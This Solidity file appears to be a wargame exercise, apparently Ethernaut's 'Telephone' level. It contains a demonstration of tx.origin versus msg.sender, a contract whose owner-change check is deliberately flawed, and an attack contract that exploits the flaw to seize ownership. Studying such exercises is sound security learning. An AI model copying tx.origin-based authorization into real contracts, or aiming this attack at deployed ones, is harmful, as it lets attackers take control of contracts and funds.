// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract TxOriginPOC {
    event SenderAndTxOriginEvent(address sender, address txOrigin);

    function callMe() public {
        emit SenderAndTxOriginEvent(msg.sender, tx.origin);
    }
}

contract AttackTxOriginPOC {
    /**
        This POC is to prove that tx.origin is the private key that signs this transaction
        while msg.sender is the address that calls the function but may not have originated the transaction
    */
    function attack(address _txOriginPOC) public {
        TxOriginPOC txOriginPOC = TxOriginPOC(_txOriginPOC);

        txOriginPOC.callMe();
    }
}

contract Telephone {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}

contract AttackTelephone {
    function attack(address _telephone) public {
        Telephone telephone = Telephone(_telephone);

        telephone.changeOwner(msg.sender);
    }
}
